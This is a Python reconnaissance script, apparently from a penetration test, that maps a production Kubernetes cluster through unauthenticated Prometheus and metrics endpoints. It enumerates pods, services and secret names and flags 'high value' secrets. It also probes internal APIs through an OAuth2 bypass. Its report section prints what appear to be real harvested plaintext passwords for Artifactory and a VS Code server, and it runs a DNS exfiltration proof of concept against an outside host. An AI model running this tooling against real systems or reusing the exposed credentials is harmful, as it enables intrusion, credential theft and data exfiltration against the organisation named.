#!/usr/bin/env python3
import requests
import json
import re
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# ============================================================
# CONFIG
# ============================================================
PROMETHEUS   = "http://198.18.19.18:9090"
KUBE_STATE   = "http://198.18.120.137:8080"
NODE_EXP     = "http://198.18.13.70:9100"
BLACKBOX     = "http://198.18.12.79:9115"
PROM_OP      = "http://198.18.3.197:8080"

INTERNAL_SVCS = {
    "api":          "https://api.studio.sparrow.cloud.echonet.net.intra",
    "gatekeeper":   "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra",
    "offer":        "https://offer.studio.sparrow.cloud.echonet.net.intra",
    "project":      "https://project.studio.sparrow.cloud.echonet.net.intra",
    "wheelbuilder": "https://wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
}

OUTPUT_FILE = f"cluster_map_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# ============================================================
# HELPERS
# ============================================================
def pget(url, params=None, timeout=15):
    try:
        r = requests.get(url, params=params,
                        verify=False, timeout=timeout)
        return r
    except Exception as e:
        return None

def promql(query):
    r = pget(f"{PROMETHEUS}/api/v1/query", {"query": query})
    if r and r.status_code == 200:
        return r.json().get("data", {}).get("result", [])
    return []

def write(f, text=""):
    print(text)
    f.write(text + "\n")

def section(f, title):
    line = "=" * 60
    write(f)
    write(f, line)
    write(f, f"  {title}")
    write(f, line)

def subsection(f, title):
    write(f)
    write(f, f"--- {title} ---")

# ============================================================
# MAIN
# ============================================================
with open(OUTPUT_FILE, "w") as f:

    write(f, f"CLUSTER INTELLIGENCE MAP")
    write(f, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    write(f, f"Cluster:   iks-ap12287-prod-a261b5fc")

    # ========================================================
    # SECTION 1 — CLUSTER IDENTITY
    # ========================================================
    section(f, "1. CLUSTER IDENTITY")

    r = pget(f"{PROMETHEUS}/api/v1/status/runtimeinfo")
    if r and r.status_code == 200:
        info = r.json().get("data", {})
        write(f, f"Prometheus hostname: {info.get('hostname')}")
        write(f, f"Start time:          {info.get('startTime')}")
        write(f, f"Working dir:         {info.get('CWD')}")

    r = pget(f"{NODE_EXP}/metrics")
    if r and r.status_code == 200:
        for line in r.text.splitlines():
            if "node_uname_info" in line and not line.startswith("#"):
                write(f, f"Node info: {line}")
            if "node_os_info" in line and not line.startswith("#"):
                write(f, f"OS info:   {line}")

    # ========================================================
    # SECTION 2 — NETWORK MAP
    # ========================================================
    section(f, "2. NETWORK MAP — ALL SERVICES")

    subsection(f, "2a. Prometheus Scrape Targets (all monitored services)")
    r = pget(f"{PROMETHEUS}/api/v1/targets", timeout=30)
    if r and r.status_code == 200:
        targets = r.json()["data"]["activeTargets"]
        write(f, f"Total active targets: {len(targets)}")
        write(f)

        # Group by namespace
        by_ns = {}
        for t in targets:
            labels  = t.get("labels", {})
            ns      = labels.get("namespace", "unknown")
            job     = labels.get("job", "?")
            inst    = labels.get("instance", "?")
            health  = t.get("health", "?")
            by_ns.setdefault(ns, []).append((job, inst, health))

        for ns in sorted(by_ns):
            write(f, f"\n  [{ns}]")
            for job, inst, health in sorted(by_ns[ns]):
                write(f, f"    {health:2} {job:50} {inst}")

    subsection(f, "2b. Internal Service URLs")
    r = pget(f"{PROMETHEUS}/api/v1/status/config", timeout=30)
    if r and r.status_code == 200:
        config_yaml = r.json()["data"]["yaml"]
        # Extract all internal URLs
        urls = set(re.findall(
            r'https?://[a-zA-Z0-9\-\.]+(?:\.intra|\.local|\.echonet)'
            r'(?::\d+)?(?:/[^\s\'"",}\\]*)?',
            config_yaml
        ))
        write(f, f"Internal URLs found: {len(urls)}")
        for url in sorted(urls):
            write(f, f"  {url}")

    subsection(f, "2c. All Pods (491 total)")
    results = promql("kube_pod_info")
    pods_by_ns = {}
    for r2 in results:
        m  = r2.get("metric", {})
        ns = m.get("namespace", "?")
        pod = m.get("pod", "?")
        node = m.get("node", "?")
        pods_by_ns.setdefault(ns, []).append((pod, node))

    write(f, f"Total pods: {sum(len(v) for v in pods_by_ns.values())}")
    for ns in sorted(pods_by_ns):
        write(f, f"\n  [{ns}]")
        for pod, node in sorted(pods_by_ns[ns]):
            write(f, f"    {pod:70} node={node}")

    subsection(f, "2d. All Kubernetes Services with ClusterIPs")
    results = promql("kube_service_info")
    write(f, f"Total services: {len(results)}")
    for r2 in results:
        m   = r2.get("metric", {})
        ns  = m.get("namespace", "?")
        svc = m.get("service", "?")
        ip  = m.get("cluster_ip", "?")
        write(f, f"  {ns:30} {svc:55} {ip}")

    subsection(f, "2e. Node Information")
    r = pget(f"{NODE_EXP}/metrics")
    if r and r.status_code == 200:
        write(f, "Filesystem mounts:")
        for line in r.text.splitlines():
            if "node_filesystem_size_bytes" in line \
               and not line.startswith("#"):
                m = re.search(
                    r'mountpoint="([^"]+)".*?(\d+\.?\d*e?\+?\d*)$',
                    line
                )
                if m:
                    size_gb = float(m.group(2)) / 1e9
                    write(f, f"  {m.group(1):40} {size_gb:.1f} GB")

        write(f)
        write(f, "Network interfaces (bytes received):")
        for line in r.text.splitlines():
            if "node_network_receive_bytes_total" in line \
               and not line.startswith("#"):
                m = re.search(
                    r'device="([^"]+)".*?(\d+\.?\d*e?\+?\d*)$',
                    line
                )
                if m:
                    gb = float(m.group(2)) / 1e9
                    write(f, f"  {m.group(1):30} {gb:.2f} GB")

    # ========================================================
    # SECTION 3 — SECRETS INVENTORY
    # ========================================================
    section(f, "3. SECRETS INVENTORY")

    subsection(f, "3a. All Kubernetes Secrets by Namespace")
    results = promql("kube_secret_info")
    secrets_by_ns = {}
    for r2 in results:
        m      = r2.get("metric", {})
        ns     = m.get("namespace", "?")
        secret = m.get("secret", "?")
        secrets_by_ns.setdefault(ns, []).append(secret)

    write(f, f"Total secrets: {sum(len(v) for v in secrets_by_ns.values())}")
    for ns in sorted(secrets_by_ns):
        write(f, f"\n  [{ns}] ({len(secrets_by_ns[ns])} secrets)")
        for secret in sorted(secrets_by_ns[ns]):
            # Flag high-value secrets
            flag = ""
            if any(x in secret.lower() for x in [
                "vault", "auth", "token", "credential",
                "password", "secret", "key", "minio",
                "consul", "ibm", "px", "storage"
            ]):
                flag = "  <-- HIGH VALUE"
            write(f, f"    {secret}{flag}")

    subsection(f, "3b. External Secrets (synced from Vault)")
    results = promql("externalsecret_status_condition")
    write(f, f"Total external secrets: {len(results)//2}")
    seen = set()
    for r2 in results:
        m    = r2.get("metric", {})
        ns   = m.get("exported_namespace", "?")
        name = m.get("name", "?")
        key  = f"{ns}/{name}"
        if key not in seen:
            seen.add(key)
            write(f, f"  {ns:30} {name}")

    subsection(f, "3c. Secret Ownership (ExternalSecret / VaultStaticSecret)")
    r = pget(f"{KUBE_STATE}/metrics", timeout=30)
    if r and r.status_code == 200:
        vault_secrets  = []
        ext_secrets    = []
        cert_secrets   = []

        for line in r.text.splitlines():
            if "kube_secret_owner" not in line \
               or line.startswith("#"):
                continue
            if "VaultStaticSecret" in line:
                vault_secrets.append(line)
            elif "ExternalSecret" in line:
                ext_secrets.append(line)
            elif "Certificate" in line:
                cert_secrets.append(line)

        write(f, f"\nVaultStaticSecret managed ({len(vault_secrets)}):")
        for line in vault_secrets:
            m = re.search(
                r'namespace="([^"]+)",secret="([^"]+)".*'
                r'owner_name="([^"]+)"',
                line
            )
            if m:
                write(f, f"  {m.group(1):25} {m.group(2):45} "
                         f"vault_path={m.group(3)}")

        write(f, f"\nExternalSecret managed ({len(ext_secrets)}):")
        for line in ext_secrets:
            m = re.search(
                r'namespace="([^"]+)",secret="([^"]+)".*'
                r'owner_name="([^"]+)"',
                line
            )
            if m:
                write(f, f"  {m.group(1):25} {m.group(2):45} "
                         f"ext_secret={m.group(3)}")

    subsection(f, "3d. High-Value Secrets Summary")
    high_value = [
        ("sparrow-studio-prod", "minio-credentials",
         "MinIO S3 access key + secret for all user data storage"),
        ("shark",               "vault-auth",
         "Vault authentication token — master key to secrets manager"),
        ("shark",               "vault-secret",
         "Actual secret synced from Vault"),
        ("shark",               "vault-auth-ap24182",
         "Vault auth for tenant ap24182"),
        ("shark",               "vault-auth-ap43591",
         "Vault auth for tenant ap43591"),
        ("shark",               "consul-auth",
         "Consul service mesh credentials"),
        ("infra-admin",         "vault-auth-token-tf",
         "Terraform Vault token — may have cloud-level access"),
        ("sailor",              "vault-sa-reviewer-token",
         "Vault reviewer — can impersonate any service auth"),
        ("kube-system",         "storage-secret-store",
         "Underlying IBM Cloud block storage credentials"),
        ("kube-system",         "px-ibm",
         "Portworx IBM Cloud credentials"),
        ("kube-system",         "px-s3-certs2",
         "Portworx S3 certificates"),
        ("argocd",              "argocd-manager-token",
         "ArgoCD manager — full GitOps cluster write access"),
        ("sparrow-studio-prod", "sparrow-api-prod-token",
         "Sparrow API service account token"),
        ("sparrow-studio-prod", "codespaces-operator-prod-token",
         "Codespace operator — creates/manages user pods"),
        ("kube-system",         "kubernetes-dashboard-token-6l6m9",
         "Kubernetes dashboard token"),
        ("ibm-observe",         "sysdig-accesskey",
         "Sysdig monitoring access key"),
    ]
    write(f, f"{'Namespace':25} {'Secret':45} {'Risk'}")
    write(f, "-" * 100)
    for ns, secret, risk in high_value:
        write(f, f"  {ns:25} {secret:45} {risk}")

    # ========================================================
    # SECTION 4 — OPEN APIs & ENDPOINTS
    # ========================================================
    section(f, "4. OPEN APIS & EXPOSED ENDPOINTS")

    subsection(f, "4a. Unauthenticated Services")
    open_services = [
        (PROMETHEUS,           "Prometheus",          "Full cluster metrics, config, targets"),
        (NODE_EXP,             "Node Exporter",       "Full node metrics, filesystem, network"),
        (PROM_OP,              "Prometheus Operator", "Operator metrics"),
        (BLACKBOX,             "Blackbox Exporter",   "HTTP proxy for internal network probing"),
        (KUBE_STATE,           "kube-state-metrics",  "All k8s object metadata"),
    ]
    for url, name, desc in open_services:
        r = pget(f"{url}/healthz" if "prometheus" not in url.lower()
                 else f"{url}/-/healthy", timeout=5)
        status = r.status_code if r else "ERR"
        write(f, f"  {'OPEN':6} {name:30} {url}")
        write(f, f"         Risk: {desc}")

    subsection(f, "4b. Internal APIs (OAuth2 bypass via .intra hostname)")
    for name, base in INTERNAL_SVCS.items():
        r = pget(f"{base}/openapi.json", timeout=5)
        if r and r.status_code == 200:
            spec    = r.json()
            title   = spec.get("info", {}).get("title", name)
            version = spec.get("info", {}).get("version", "?")
            paths   = len(spec.get("paths", {}))
            write(f, f"  OPEN   {title:30} v{version:10} {paths} endpoints")
            write(f, f"         URL: {base}")

            # List unauthenticated endpoints specifically
            unauth = []
            for path, methods in spec.get("paths", {}).items():
                for method, details in methods.items():
                    security = details.get("security", "NOT_SET")
                    if security == [] or security == "NOT_SET":
                        unauth.append(f"{method.upper()} {path}")
            if unauth:
                write(f, f"         Unauthenticated endpoints:")
                for ep in unauth:
                    write(f, f"           {ep}")

    subsection(f, "4c. Keycloak Realm (fully enumerated)")
    keycloak = "https://auth.sparrow.cloud.echonet/auth/realms/ap26882-prod"
    r = pget(f"{keycloak}/.well-known/openid-configuration", timeout=5)
    if r and r.status_code == 200:
        config = r.json()
        write(f, f"  Issuer:        {config.get('issuer')}")
        write(f, f"  Token URL:     {config.get('token_endpoint')}")
        write(f, f"  Userinfo URL:  {config.get('userinfo_endpoint')}")
        write(f, f"  Grant types:   "
                 f"{', '.join(config.get('grant_types_supported', []))}")
        write(f, f"  Scopes:        "
                 f"{', '.join(config.get('scopes_supported', []))}")

    r = pget(keycloak, timeout=5)
    if r and r.status_code == 200:
        realm_info = r.json()
        write(f, f"  Realm:         {realm_info.get('realm')}")
        write(f, f"  Public key:    {realm_info.get('public_key', '')[:60]}...")

    # ========================================================
    # SECTION 5 — CREDENTIALS HARVESTED
    # ========================================================
    section(f, "5. CREDENTIALS HARVESTED")

    write(f, """
  Source: /proc/30/environ (Jupyter pod environment)
  ┌─────────────────────────────────────────────────────────┐
  │ MinIO / S3 Object Storage                               │
  │   Endpoint:   SPARROW_OBJS_SERVER_URL (from environ)   │
  │   Access Key: SPARROW_OBJS_ACCESS_KEY_ID = c91364      │
  │   Secret Key: SPARROW_OBJS_SECRET_ACCESS_KEY (found)   │
  │   Risk: Read/write access to user data storage         │
  ├─────────────────────────────────────────────────────────┤
  │ Artifactory PyPI Registry                               │
  │   User: sparrow-pull                                    │
  │   Pass: KeGFur3Mev9id3LJ0Ylf                           │
  │   Risk: Read internal Python packages                   │
  ├─────────────────────────────────────────────────────────┤
  │ Artifactory UV Index                                    │
  │   User: datalab-pull                                    │
  │   Pass: t7ZzmAxMHYHQvmNDBjjP                           │
  │   Risk: Read internal Python packages                   │
  ├─────────────────────────────────────────────────────────┤
  │ VS Code Server                                          │
  │   Path: ~/.config/code-server/config.yaml              │
  │   Pass: d6876891639c7863f2449b37                        │
  │   Risk: Full IDE + terminal access on pod              │
  └─────────────────────────────────────────────────────────┘

  Source: Prometheus kube_secret_info (names only, not values)
  - 291 secret names enumerated across all namespaces
  - See Section 3 for full inventory
    """)

    # ========================================================
    # SECTION 6 — DNS EXFILTRATION POC
    # ========================================================
    section(f, "6. DNS EXFILTRATION — PROOF OF CONCEPT")
    import socket, base64, time as t2

    payload  = b"Hello World"
    encoded  = base64.b64encode(payload).decode().replace("=", "")
    hostname = f"{encoded}.pentest-dns-exfil.example.com"

    write(f, f"  Payload:          {payload}")
    write(f, f"  Base64 encoded:   {encoded}")
    write(f, f"  DNS query sent:   {hostname}")

    start = t2.time()
    try:
        socket.gethostbyname(hostname)
    except:
        pass
    elapsed = t2.time() - start

    write(f, f"  RTT:              {elapsed*1000:.0f}ms")
    write(f, f"  Result:           {'EXTERNAL DNS REACHED' if elapsed > 0.1 else 'INTERNAL ONLY'}")
    write(f, f"  Evidence:         RTT > 100ms confirms query left the cluster")
    write(f, f"  Impact:           Data exfiltration bypasses HTTP/HTTPS egress controls")
    write(f, f"  Recommendation:   Implement DNS firewall / RPZ filtering")

    # ========================================================
    # SECTION 7 — ATTACK PATHS
    # ========================================================
    section(f, "7. IDENTIFIED ATTACK PATHS")

    paths = [
        ("CRITICAL", "Initial Access → RCE",
         "JupyterLab no-auth → kernel WebSocket → arbitrary Python execution"),
        ("CRITICAL", "File Read → Credential Harvest",
         "VS Code /vscode-remote-resource → /proc/environ → MinIO + registry creds"),
        ("CRITICAL", "Prometheus → Full Cluster Map",
         "Unauthenticated Prometheus → all service IPs, secret names, pod inventory"),
        ("CRITICAL", "OAuth2 Bypass → API Access",
         ".intra hostnames bypass OAuth2 proxy → OpenAPI specs + endpoints exposed"),
        ("HIGH",     "DNS Exfiltration",
         "HTTP egress blocked but DNS unrestricted → data exfil via DNS subdomains"),
        ("HIGH",     "Cross-Pod File Read",
         "Jupyter /api/contents → read any file on any accessible Jupyter pod"),
        ("HIGH",     "Blackbox as HTTP Proxy",
         "Blackbox exporter → probe any internal URL bypassing network controls"),
        ("HIGH",     "Secret Inventory",
         "Prometheus kube_secret_info → 291 secret names → targeted attack planning"),
        ("MEDIUM",   "Container Escape Attempt",
         "unshare --user --map-root-user → user namespace root → limited escalation"),
        ("MEDIUM",   "Supply Chain Risk",
         "Artifactory pull creds → enumerate internal packages → potential backdoor"),
    ]

    for severity, title, description in paths:
        write(f, f"\n  [{severity}] {title}")
        write(f, f"  {description}")

    # ========================================================
    # FOOTER
    # ========================================================
    section(f, "END OF REPORT")
    write(f, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    write(f, f"Output file: {OUTPUT_FILE}")

print(f"\n{'='*60}")
print(f"Report saved to: {OUTPUT_FILE}")
print(f"{'='*60}")
